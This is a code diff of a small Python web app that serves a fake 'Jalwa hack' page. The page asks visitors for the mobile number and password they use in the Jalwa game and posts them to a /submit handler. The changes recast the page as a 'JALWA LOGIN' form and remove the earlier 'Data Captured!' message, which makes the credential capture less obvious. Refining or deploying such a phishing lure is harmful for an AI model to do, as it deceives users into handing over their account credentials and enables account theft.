@@ -16,11 +16,11 @@ def home():
                 height: 100vh;
                 width: 100%;
                 background: linear-gradient(135deg, #000000, #0f0f0f);
-                color: #39ff14;
                 font-family: monospace;
                 display: flex;
                 justify-content: center;
                 align-items: center;
+                color: #39ff14;
             }
             .container {
                 text-align: center;
@@ -33,15 +33,14 @@ def home():
             }
             h1 {
                 color: #00ff00;
-                text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 40px #0ff;
-                font-size: 30px;
+                text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00;
+                font-size: 28px;
                 margin-bottom: 10px;
             }
-            h3 {
+            p {
                 color: #ff0080;
-                text-shadow: 0 0 5px #ff0080, 0 0 10px #ff0080;
-                font-size: 20px;
-                margin-top: 0;
+                font-size: 14px;
+                text-shadow: 0 0 5px #ff0080;
             }
             input[type="text"], input[type="password"] {
                 width: 90%;
@@ -51,15 +50,19 @@ def home():
                 color: #39ff14;
                 border: 2px solid #ff0080;
                 border-radius: 8px;
-                font-size: 18px;
+                font-size: 16px;
                 box-shadow: 0 0 10px #ff0080;
+            }
+            input::placeholder {
+                color: #39ff14;
+                opacity: 0.7;
             }
             input[type="submit"] {
                 width: 95%;
                 padding: 12px;
-                font-size: 20px;
+                font-size: 18px;
                 color: #000;
-                background: linear-gradient(45deg, #39ff14, #00ffff);
+                background: linear-gradient(45deg, #39ff14, #00ffff, #ff0080);
                 border: none;
                 border-radius: 8px;
                 cursor: pointer;
@@ -70,23 +73,20 @@ def home():
                 box-shadow: 0 0 20px #ff0080, 0 0 30px #ff0000;
                 color: #fff;
             }
-            p {
-                color: #ffff00;
-                font-size: 16px;
-                text-shadow: 0 0 5px #ffff00;
-            }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🔥 JALWA HACK TOOL ULTIMATE 🔥</h1>
-            <h3>H A C K   N U M B E R   F O U N D !</h3>
+            <h1>JALWA LOGIN</h1>
+            <p>Welcome to Rb premium Hack.<br>Sign in to continue. Activate Hack 🤖👾</p>
             <form action="/submit" method="post">
-                <input type="text" name="number" placeholder="Enter Mobile Number"><br>
-                <input type="password" name="password" placeholder="Enter Password"><br>
-                <input type="submit" value="💣 Hack Now 💣">
+                <input type="text" name="number" placeholder="🆔 Enter Mobile Number"><br>
+                <input type="password" name="password" placeholder="🔑 Enter Password"><br>
+                <input type="submit" value="Sign In">
             </form>
-            <p>Use this number to sign up and activate hack - Jalwa Mode ON!</p>
+            <p>Enter a valid 🆔 && password 🔑 🔑<br>
+            (Aapne jis mobile number or password se game open kiya hai vhi mobile or password dalkr login kre)<br>
+            Otherwise not access ♿ hack</p>
         </div>
     </body>
     </html>
@@ -101,7 +101,7 @@ def submit():
     return '''
     <html>
     <head>
-        <title>Hack Success</title>
+        <title>Hack Activated</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
             body {
@@ -114,6 +114,12 @@ def submit():
             h2 {
                 color: #00ff00;
                 text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+                font-size: 24px;
+            }
+            p {
+                color: #ff0080;
+                font-size: 18px;
+                text-shadow: 0 0 5px #ff0080;
             }
             a {
                 color: #39ff14;
@@ -123,7 +129,8 @@ def submit():
         </style>
     </head>
     <body>
-        <h2>✅ Hack Successful! Data Captured!</h2>
+        <h2>✅ Hack Successful! Activated!!</h2>
+        <p>H A C K   N U M B E R   F O U N D !</p>
         <a href="/">Back to Hack</a>
     </body>
     </html>
